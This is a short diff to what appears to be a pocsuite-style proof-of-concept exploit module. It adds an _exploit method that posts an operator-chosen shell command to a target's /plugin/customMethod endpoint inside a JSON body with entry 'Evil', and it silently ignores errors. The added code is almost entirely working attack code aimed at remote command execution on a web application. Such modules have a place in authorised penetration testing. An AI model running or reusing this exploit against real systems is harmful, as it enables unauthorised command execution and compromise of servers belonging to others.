@@ -78,6 +78,18 @@ class DemoPOC(POCBase):
     def _shell(self):
         cmd = self.get_option("payload")
         self._exploit(cmd)
+    
+    def _exploit(self, cmd):
+        result = {}
+        url = self.url.rstrip('/') + "/plugin/customMethod"
+        data = '{"entry":"Evil","request":"' + cmd + '"}'
+        headers = {
+            "Content-Type": "application/json"
+        }
+        try:
+            _ = requests.post(url, data=data, headers=headers, timeout=5)
+        except Exception as ex:
+            pass
 
     def parse_output(self, result):
         output = Output(self)
